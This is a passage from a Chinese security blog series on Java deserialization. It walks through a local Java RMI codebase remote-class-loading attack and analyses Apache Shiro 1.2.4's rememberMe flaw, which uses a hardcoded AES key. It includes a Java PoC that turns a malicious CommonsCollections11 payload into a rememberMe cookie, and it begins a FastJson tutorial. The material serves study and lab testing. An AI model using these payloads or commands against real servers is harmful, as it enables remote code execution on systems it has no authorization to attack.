<p>实际上，我们在<a href="https://leihehehe.github.io/2021/07/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJAVA-RMI%E5%8E%9F%E7%90%86%E3%80%81%E6%B5%81%E7%A8%8B-2/">Java反序列化漏洞之JAVA RMI原理、流程(2)</a>就有提到过，远程方法的调用是在server进行的，而并非<strong>本地client端</strong>，同时，远程调用的方法参数是经过序列化的。</p>
<p>拿这个例子来说，我们首先用<code>ICalc r = (ICalc) Naming.lookup(&quot;rmi://127.0.0.1:1099/refObj&quot;);</code>找到了<strong>Registry</strong>上的<strong>refobj</strong>方法，又调用了其<strong>sum</strong>方法。关键点在于，我们在调用其<strong>sum</strong>方法的时候传入了我们在本地构造的 <code>Payload</code> 类型的对象 <code>li</code>，<code>li</code>被序列化，随<code>sum()</code>传入<strong>server进行调用</strong>，接着server端会对它进行<strong>反序列化</strong>。在反序列化的过程中，<strong>RemoteRMIServer.java</strong>发现这个Payload类它并不认识，因为在server端并没有该类。于是它就去<strong>codebase</strong>指向的地址上找Payload类，找到后将该类的定义下载下来，然后才能反序列化<code>li</code>对象。</p>
<p>而我们的Payload类的static方法中有恶意代码(此处我们是将payload类和RMIClient写在一起了)，所以当server加载后，会执行该恶意代码。</p>
<h4 id="Policy配置"><a href="#Policy配置" class="headerlink" title="Policy配置"></a>Policy配置</h4><p>Server端和Client端都需要新建一个文件来控制RMI的访问权限，这里我们命名为<strong>client.policy</strong></p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="环境模拟"><a href="#环境模拟" class="headerlink" title="环境模拟"></a>环境模拟</h4><p>我们在IDEA中选择build project，让它生成class文件。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212231734543.png" alt="image-20211212231734543"></p>
<p>此时out目录下会生成我们所有的class文件</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212234937446.png" alt="image-20211212234937446"></p>
<p>在真实环境中，<strong>RMIClient</strong>是在攻击者的电脑上运行的，所以我把<strong>RMIClient</strong>移动到<strong>其他目录</strong>下来模拟这个环境。</p>
<p>如果你进入out/production/RM_ITEST生成目录（不在IDEA中）下看的话，你会发现还有一个class文件 - <strong>RMIClient$Payload.class</strong>，这是我们在RMIClient内部生成的class文件，也就是Server会去找的Payload类，我们也不能让它与<strong>RemoteRMIServer.class</strong>在一个目录，不然Server端是能在本地找到Payload类的，从而不能触发漏洞。同样将它移动到其他目录去，这里我把它和<strong>RMIClient.class、ICalc</strong>放一起。</p>
<p>这里可能会有疑问为什么要将<strong>ICalc</strong>也放在这，因为我们在Client的代码中将stub转换成了ICalc类，所以也得放在一起。那能不能不转换呢？答案是不可以，经过测试，Stub必须被转化为相应的类，否则call其方法的时候不会有反应。注意这里也需要client.policy,因为我们在client也配置了SecurityManager</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213001727380.png" alt="image-20211213001727380"></p>
<p>一切准备就绪，先运行Server端</p>
<p>这里我选择用<strong>terminal</strong>来执行，你也可以使用IDEA的配置来执行</p>
<p><code>java -Djava.rmi.server.hostname=127.0.0.1 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer</code></p>
<p>此处<strong>hostname</strong>为你RMI服务器的地址，<strong>security.policy</strong>是我们之前创建的policy文件的名字，<strong>RemoteRMIServer</strong>是我们要运行的Java class文件名字</p>
<p>你需要在生成的相关<strong>class</strong>文件目录下运行命令(之前一直在IDEA下面的terminal运行，运行实际是在java文件目录下，导致卡在这里很久)</p>
<p>接着你需要模仿攻击者，在你的恶意类(RMIClient$Payload.class)所在目录搭建一个<strong>http</strong>服务，供<strong>server</strong>端访问下载你的恶意类</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212233501619.png" alt="image-20211212233501619"></p>
<p>此处我使用python，在本地搭建了一个8080端口的web服务</p>
<p>接着，可以用<strong>RMIClient</strong>实施攻击了</p>
<p><code>java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://127.0.0.1:8080/ -Djava.security.policy=client.policy RMIClient</code></p>
<p>这里的codebase是你搭建的web服务地址，<strong>RMIClient</strong>为你运行的Class名字。</p>
<p>成功弹出计算器！<strong>计算器被弹出两次</strong>，第一次是因为Client创建Payload实例(在攻击者电脑上弹出)，第二次是远程执行(在被攻击服务端上弹出)。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212233854484.png" alt="image-20211212233854484"></p>
<p>同时我们在python运行的web服务上也能看到class加载记录</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213001956198.png" alt="image-20211213001956198"></p>
<h3 id="Reference-6"><a href="#Reference-6" class="headerlink" title="Reference"></a>Reference</h3><p>P神 - Java安全漫谈</p>
<h1 id="Shiro反序列化漏洞系列"><a href="#Shiro反序列化漏洞系列" class="headerlink" title="Shiro反序列化漏洞系列"></a>Shiro反序列化漏洞系列</h1><h2 id="Shiro550反序列化漏洞"><a href="#Shiro550反序列化漏洞" class="headerlink" title="Shiro550反序列化漏洞"></a>Shiro550反序列化漏洞</h2><h3 id="环境搭建-8"><a href="#环境搭建-8" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git  </span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>

<p>在Intellij中将<strong>samples/web</strong>以项目的形式打开，在pom.xml中将jstl修改为1.2版本</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>整个project将使用jdk1.8</p>
<p>Tomcat配置如下：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223132310175.png" alt="image-20211223132310175"></p>
<p>运行即可。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223151852743.png" alt="image-20211223151852743"></p>
<h3 id="反序列化触发流程"><a href="#反序列化触发流程" class="headerlink" title="反序列化触发流程"></a>反序列化触发流程</h3><h4 id="入手点"><a href="#入手点" class="headerlink" title="入手点"></a>入手点</h4><p>问题主要出在登录处的<strong>Remember Me</strong>功能。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223152235321.png" alt="image-20211223152235321"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223152603584.png" alt="image-20211223152603584"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223152643912.png" alt="image-20211223152643912"></p>
<p>我们发现登陆后的cookie中会有rememberMe的字段，同时后面跟了一长串的数据。</p>
<p>我们猜测rememberMe可能保存了我们的账号密码数据</p>
<p>为了验证我们的猜想，在Intellij中连续按两下shift，搜索RememberMe</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223153240686.png" alt="image-20211223153240686"></p>
<p>这里找到了相关的Class，我们进入AbstractRememberMeManager看一下</p>
<p>看名字，我们就能猜出是和Remember Me这个功能有关</p>
<p>看一下它的constructor</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);<span class="comment">//此处设置了cipher key</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCipherKey</span><span class="params">(<span class="type">byte</span>[] cipherKey)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.setEncryptionCipherKey(cipherKey);</span><br><span class="line">    <span class="built_in">this</span>.setDecryptionCipherKey(cipherKey);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEncryptionCipherKey</span><span class="params">(<span class="type">byte</span>[] encryptionCipherKey)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.encryptionCipherKey = encryptionCipherKey;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDecryptionCipherKey</span><span class="params">(<span class="type">byte</span>[] decryptionCipherKey)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decryptionCipherKey = decryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现，<strong>AbstractRememberMeManager</strong>被创建的时候，会<strong>setCipherKey</strong>，而这个key是默认的。</p>
<p>分析到这里，好像和我们的remember Me没什么关系，继续往下看。</p>
<h4 id="RememberMe生成"><a href="#RememberMe生成" class="headerlink" title="RememberMe生成"></a>RememberMe生成</h4><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223154957970.png" alt="image-20211223154957970"></p>
<p>我们在登录成功这里下个断点,发现他会call到rememberIdentity()</p>
<p>我们跟进去</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo)</span> &#123;</span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="built_in">this</span>.getIdentityToRemember(subject, authcInfo);<span class="comment">//1</span></span><br><span class="line">    <span class="built_in">this</span>.rememberIdentity(subject, principals);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">protected</span> PrincipalCollection <span class="title function_">getIdentityToRemember</span><span class="params">(Subject subject, AuthenticationInfo info)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> info.getPrincipals();<span class="comment">//2</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们发现principals实际上我们的登录名</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163019109.png" alt="image-20211223163019109"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytes = <span class="built_in">this</span>.convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">    <span class="built_in">this</span>.rememberSerializedIdentity(subject, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取到账号后，又会call到rememberIdentity()</p>
<p>我们跟进convertPrincipalsToBytes()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163224292.png" alt="image-20211223163224292"></p>
<p>再跟进encrpyt()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163334597.png" alt="image-20211223163334597"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] getEncryptionCipherKey() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.encryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现<code>encryptionCipherKey</code>在之前分析的时候出现过</p>
<p>再回顾一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.setCipherKey(DEFAULT_CIPHER_KEY_BYTES);<span class="comment">//此处设置了cipher key</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCipherKey</span><span class="params">(<span class="type">byte</span>[] cipherKey)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.setEncryptionCipherKey(cipherKey);<span class="comment">//设置加密密钥</span></span><br><span class="line">    <span class="built_in">this</span>.setDecryptionCipherKey(cipherKey);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEncryptionCipherKey</span><span class="params">(<span class="type">byte</span>[] encryptionCipherKey)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.encryptionCipherKey = encryptionCipherKey;<span class="comment">//由此我们可以看出，其实encryptionCipherKey就是上面默认的key</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDecryptionCipherKey</span><span class="params">(<span class="type">byte</span>[] decryptionCipherKey)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decryptionCipherKey = decryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到现在，我们已经明白，用户信息被做了AES加密</p>
<p>当加密数据都被返回后，下一步会执行rememberSerializedIdentity()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163615319.png" alt="image-20211223163615319"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163755978.png" alt="image-20211223163755978"></p>
<p><strong>因此我们可以判断出cookie中的rememberMe的产生流程</strong></p>
<ul>
<li>序列化用户名</li>
<li>AES加密序列化后的数据</li>
<li>base64编码处理上一步的数据</li>
<li>最后放入cookie</li>
</ul>
<h4 id="RememberMe解密"><a href="#RememberMe解密" class="headerlink" title="RememberMe解密"></a>RememberMe解密</h4><p>在AbstractRememberMeManager#getRememberedPrincipals下一个断点</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165224129.png" alt="image-20211223165224129"></p>
<p>然后重启服务器，会被断下来</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165446209.png" alt="image-20211223165446209"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165804156.png" alt="image-20211223165804156"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165926366.png" alt="image-20211223165926366"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165955572.png" alt="image-20211223165955572"></p>
<p><strong>现在RememberMe解密的流程也显而易见:</strong></p>
<ul>
<li>从Cookie中获取RememberMe值</li>
<li>获取到的值进行base64解码</li>
<li>base64解码</li>
<li>反序列化</li>
</ul>
<h3 id="漏洞利用及POC"><a href="#漏洞利用及POC" class="headerlink" title="漏洞利用及POC"></a>漏洞利用及POC</h3><p>首先在pom.xml中添加commons-collections dependency</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意要reload maven（因为忘记重载maven，在这里卡了半天，发现后面的ClassLoader一直找不到class，调试半天也没搞明白为什么没有这个库）</p>
<p>这里我们将用到<strong>CommonsCollections11</strong>的链，CC6的链在此处不能打成功 - 因为Transformer[]会在寻找class的时候出现格式问题，其中会涉及到<strong>ParallelWebappClassLoader</strong>的父类<strong>WebappClassLoaderBase#loadClass</strong>；因此我们选择CommonCollections11这个链(没有Transformer[]数组)</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223232137157.png" alt="image-20211223232137157"></p>
<p>详见 <a href="https://www.cnblogs.com/W4nder/p/14508817.html%EF%BC%8C%E6%88%91%E5%9C%A8%E6%AD%A4%E5%A4%84%E5%B0%B1%E4%B8%8D%E5%A4%9A%E8%AE%B2%E8%A7%A3%E3%80%82">https://www.cnblogs.com/W4nder/p/14508817.html，我在此处就不多讲解。</a></p>
<p><strong>POC构造</strong></p>
<p><strong>此处我新建了一个项目，同时导入了三个库</strong></p>
<ul>
<li>shiro-core-1.2.4</li>
<li>slf4j-api-1.6.4</li>
<li>slf4j-simple-1.6.4</li>
</ul>
<p>这三个jar包可以在shiro-web项目中找到: 打开shiro-web项目下的pom.xml文件，搜索这三个库，然后鼠标放在名字上面即可看到路径</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223233932961.png" alt="image-20211223233932961"></p>
<p>然后找到相应的目录，copy jar包并导入我们的POC项目即可</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223234007242.png" alt="image-20211223234007242"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<span class="comment">//默认密钥</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aesCipherService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] evilObj = getSerializedObj();<span class="comment">//得到byte数组类型的序列化数据</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">finalsource</span> <span class="operator">=</span> aesCipherService.encrypt(evilObj, DEFAULT_CIPHER_KEY_BYTES);<span class="comment">//对该恶意序列化数据进行AES加密</span></span><br><span class="line">        System.out.println(finalsource.toString());<span class="comment">//打印出加密后的rememberMe</span></span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getSerializedObj() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> n;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.ser&quot;</span>);<span class="comment">//加载cc11生成的恶意序列化文件</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((n=fileInputStream.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">            byteArrayOutputStream.write(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为什么我们加密后可以直接返回**finalsource.toString()**，不是说最后要base64编码吗？</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223232837239.png" alt="image-20211223232837239"></p>
<p>我们跟踪到最后可以发现，其返回了<strong>SimpleByteSource#toString()<strong>方法，而它就是返回了</strong>toBase64()</strong></p>
<p>现在我们将生成出来的一串字符复制到cookie的<strong>rememberMe</strong>处，执行后发现计算器弹出。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223232449924.png" alt="image-20211223232449924"></p>
<h3 id="Reference-7"><a href="#Reference-7" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.cnblogs.com/W4nder/p/14508817.html">shiro-1.2.4反序列化分析踩坑</a></p>
<p>P神-Java漫谈</p>
<h1 id="FastJson反序列化漏洞系列"><a href="#FastJson反序列化漏洞系列" class="headerlink" title="FastJson反序列化漏洞系列"></a>FastJson反序列化漏洞系列</h1><h2 id="前言-5"><a href="#前言-5" class="headerlink" title="前言"></a>前言</h2><p>FastJson是由阿里巴巴开发的一个java库，可将对象快速转换为json字符，同时也可将json字符串转化为相应的对象</p>
<h2 id="Fastjson的基础使用"><a href="#Fastjson的基础使用" class="headerlink" title="Fastjson的基础使用"></a>Fastjson的基础使用</h2><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>在做RESTFUL项目的时候常常需要将json数据格式进行转换，比如将<code>&#123;name:&quot;leihehe&quot;, age: 18&#125;</code>转成Student类的Object</p>
<h3 id="环境搭建-9"><a href="#环境搭建-9" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>在MAVAN中添加fastjson即可，本文将分析1.2.4及其之后的各种版本，测试时将下面的version进行修改即可。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="将对象转化为json格式"><a href="#将对象转化为json格式" class="headerlink" title="将对象转化为json格式"></a>将对象转化为json格式</h3><p>首先准备一个User类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;constructor invoked&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get name&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set name&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写一个main方法测试：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">/* Serialization */</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;leihehe&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result2</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);<span class="comment">//Label the class name</span></span><br><span class="line">        System.out.println(result);</span><br><span class="line">        System.out.println(result2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这里<code>toJSONString</code>有两种写法</p>
<ul>
<li><code>Json.toJSONString(obj)</code><ul>
<li>转换为JSON格式</li>
</ul>
</li>
<li><code>Json.toJSONString(obj,SerializerFeature.WriteClassName)</code><ul>
<li>在转换的JSON格式中指定该对象属于什么类</li>
</ul>
</li>
</ul>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108105129564.png" alt="image-20220108105129564"></p>
<p>可以发现<code>toJSONString</code>会call到get方法，其中第二种<code>JSONString</code>会返回@type，从而指明object所在类。</p>
<h3 id="将json格式转化为对象"><a href="#将json格式转化为对象" class="headerlink" title="将json格式转化为对象"></a>将json格式转化为对象</h3><p>FastJson有<strong>两种</strong>转换json格式为对象的方法</p>
<ul>
<li><code>JSON.parse(str)</code></li>
<li><code>JSON.parseObject(str)</code></li>
</ul>
<p>这两个其实都是一样的，只是<code>parseObject()</code>要比<code>parse()</code>多一个<code>toJson()</code>，也就是<code>parseObject()</code>返回的是<code>JSONObject</code>，而<code>parse()</code>返回的是其实际的类的对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> parse(text);</span><br><span class="line">    <span class="keyword">return</span> obj <span class="keyword">instanceof</span> JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>parseObject()在实际运行的时候会调用get和set方法,其中get方法会在<code>toJSON()</code>中被调用</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108111958984.png" alt="image-20220108111958984"></p>
<p>而parse()只会调用对象的set方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112115321.png" alt="image-20220108112115321"></p>
<p>此处我们以<code>parse()</code>进行演示</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Deserialization */</span></span><br><span class="line">String jsonString=<span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;leihehe\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> JSON.parse(jsonString);</span><br><span class="line">System.out.println(obj2);</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112140316.png" alt="image-20220108112140316"></p>
<p><strong>set</strong>方法并未被调用，因为fastJSON并不知道传过来的json应该被转换为哪一个类的对象，因此我们需要指定其<strong>type</strong></p>
